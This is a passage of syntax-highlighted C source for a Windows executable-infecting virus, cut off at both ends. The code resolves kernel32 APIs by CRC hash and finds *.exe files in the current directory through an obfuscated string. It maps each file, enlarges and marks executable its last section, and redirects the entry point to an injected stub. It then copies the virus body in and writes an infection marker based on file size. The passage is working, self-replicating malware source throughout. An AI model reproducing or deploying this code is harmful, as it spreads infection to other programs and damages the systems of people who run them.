            </span><span class="sc11">missed</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">K32Address</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">LoadLibraryA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iLoadLibraryA</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LoadLibraryACrc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">FindFirstFileA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iFindFirstFileA</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FindFirstFileACrc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">FindNextFileA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iFindNextFileA</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FindNextFileACrc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">OutputDebugStringA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iOutputDebugStringA</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OutputDebugStringACrc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">CreateFileA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iCreateFileA</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CreateFileACrc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">CreateFileMappingA</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iCreateFileMappingA</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CreateFileMappingACrc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">MapViewOfFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iMapViewOfFile</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapViewOfFileCrc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">UnmapViewOfFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iUnmapViewOfFile</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UnmapViewOfFileCrc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">CloseHandle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iCloseHandle</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CloseHandleCrc</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">GetFileSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">iGetFileSize</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">GetProcAddressCrc</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">K32Address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GetFileSizeCrc</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">K32Address</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">missed</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//
</span><span class="sc0">        </span><span class="sc2">// Remap the file and in the same way resize the file
</span><span class="sc0">        </span><span class="sc2">//
</span><span class="sc0">
        </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Remap</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">newsize</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">MapAddress</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">FileMapping</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">FileMapping</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PAGE_READWRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">newsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">MapAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">FileMapping</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_MAP_ALL_ACCESS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">newsize</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// drop a push instruction to a memory location
</span><span class="sc0">
        </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">createpush</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">location</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">location</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc4">0x68</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">((</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">location</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">))[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// We got the file maped at (MapAddress), we are going to infect 
</span><span class="sc0">        </span><span class="sc2">// that file
</span><span class="sc0">
        </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ProcessInfection</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// check if exe
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">MapAddress</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'ZM'</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">PE_STRUCT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">PEheaderBase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PE_STRUCT</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MapAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MapAddress</span><span class="sc10">+</span><span class="sc4">0x3C</span><span class="sc10">))[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">

                </span><span class="sc2">// check if PE
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'EP'</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// get lastsection offset
</span><span class="sc0">                    </span><span class="sc11">PE_OBJENTRY_STRUCT</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">lastsection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PE_OBJENTRY_STRUCT</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0">
                        </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">PE_STRUCT</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                        </span><span class="sc10">(</span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_numofobjects</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">PE_OBJENTRY_STRUCT</span><span class="sc10">));</span><span class="sc0">
        
                    </span><span class="sc2">// save information, later we will need to return to host
</span><span class="sc0">                    </span><span class="sc2">// viruspos will be a working variable for now
</span><span class="sc0">                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">old_entrypoint</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_entrypointrva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagebase</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">viruspos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">max</span><span class="sc10">(</span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_physsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtsize</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc2">// change last section size in physical and memory, change
</span><span class="sc0">                    </span><span class="sc2">// his permission
</span><span class="sc0">                    </span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_physsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">iround</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">viruspos</span><span class="sc10">+</span><span class="sc11">vir_size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_filealign</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">iround</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">viruspos</span><span class="sc10">+</span><span class="sc11">vir_size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_objectalign</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_objectflags</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc11">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">IMAGE_SCN_MEM_READ</span><span class="sc10">;</span><span class="sc0">
                    
                    </span><span class="sc2">// set new entry point
</span><span class="sc0">                    </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_entrypointrva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">viruspos</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtrva</span><span class="sc10">;</span><span class="sc0"> 
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">new_entrypoint</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_entrypointrva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagebase</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">old_imagebase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagebase</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc2">// viruspost is now the position where we should drop virus
</span><span class="sc0">                    </span><span class="sc11">viruspos</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_physoffs</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc2">// recalculate PE size in memory
</span><span class="sc0">                    </span><span class="sc11">PEheaderBase</span><span class="sc10">-&gt;</span><span class="sc11">pe_imagesize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtrva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_virtsize</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc2">// resize file
</span><span class="sc0">                    </span><span class="sc11">Remap</span><span class="sc10">(</span><span class="sc11">iround</span><span class="sc10">(</span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_physoffs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">lastsection</span><span class="sc10">-&gt;</span><span class="sc11">oe_physsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">69</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
                    
                    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">virusdest</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MapAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">viruspos</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc2">// we are dropping the stub loader
</span><span class="sc0">                    </span><span class="sc2">// we will push on stack old entrypoint
</span><span class="sc0">                    </span><span class="sc2">// two next value will be forwarded to virus
</span><span class="sc0">
                    </span><span class="sc11">createpush</span><span class="sc10">(</span><span class="sc11">virusdest</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">old_entrypoint</span><span class="sc10">);</span><span class="sc0"> 
                    </span><span class="sc11">createpush</span><span class="sc10">(</span><span class="sc11">virusdest</span><span class="sc10">+</span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">new_entrypoint</span><span class="sc10">+</span><span class="sc4">21</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">createpush</span><span class="sc10">(</span><span class="sc11">virusdest</span><span class="sc10">+</span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">old_imagebase</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc2">// drop call to virus
</span><span class="sc0">                    </span><span class="sc10">(</span><span class="sc11">virusdest</span><span class="sc10">+</span><span class="sc4">15</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc4">0xE8</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">virusdest</span><span class="sc10">+</span><span class="sc4">16</span><span class="sc10">))[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">start</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x00401000</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                    
                    </span><span class="sc2">// then ret, who will jump to host
</span><span class="sc0">                    </span><span class="sc10">(</span><span class="sc11">virusdest</span><span class="sc10">+</span><span class="sc4">20</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc4">0xC3</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc11">virusdest</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">21</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc2">// drop virus here (memcpy didnt worked :()
</span><span class="sc0">                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">vir_size</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc10">(</span><span class="sc11">virusdest</span><span class="sc10">++)[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">VirCode</span><span class="sc10">)[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                    
                    </span><span class="sc2">// drop virus copyright :)
</span><span class="sc0">                    </span><span class="sc10">((</span><span class="sc11">__int64</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">virusdest</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x20656D6F636C6557</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">__int64</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">virusdest</span><span class="sc10">)[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x4720656874206F74</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">__int64</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">virusdest</span><span class="sc10">)[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x2020215241425941</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">((</span><span class="sc11">__int64</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">virusdest</span><span class="sc10">)[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x334B325D584B495B</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// This function basically opens a file specified in input 
</span><span class="sc0">        </span><span class="sc2">// then maps it.  If mapping succeed and finally it ask to 
</span><span class="sc0">        </span><span class="sc2">// ProcessInfection()
</span><span class="sc0">
        </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">File</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFileA</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">FileSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">FileMapping</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">PAGE_READWRITE</span><span class="sc10">,</span><span class="sc0"> 
                    </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileSize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">FileMapping</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">MapAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">FileMapping</span><span class="sc10">,</span><span class="sc0"> 
                        </span><span class="sc11">FILE_MAP_ALL_ACCESS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileSize</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MapAddress</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">ProcessInfection</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">MapAddress</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">FileMapping</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// The real entry point of the virus.  Here, we manipulate everything
</span><span class="sc0">        </span><span class="sc2">// inside the object.  It just searches for various *.exe inside the
</span><span class="sc0">        </span><span class="sc2">// current directory
</span><span class="sc0">
        </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">start_virus</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">PEBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">VirusCode</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Import</span><span class="sc10">(</span><span class="sc11">PEBase</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">datas</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fileresult</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">VirCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">VirusCode</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">trashbuffer</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">];</span><span class="sc0">

                </span><span class="sc2">// search for *.exe
</span><span class="sc0">                </span><span class="sc10">((</span><span class="sc11">__int64</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">trashbuffer</span><span class="sc10">)[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x06578652E2A</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">fileresult</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFileA</span><span class="sc10">(</span><span class="sc11">trashbuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">datas</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fileresult</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">datas</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">69</span><span class="sc10">)</span><span class="sc0">
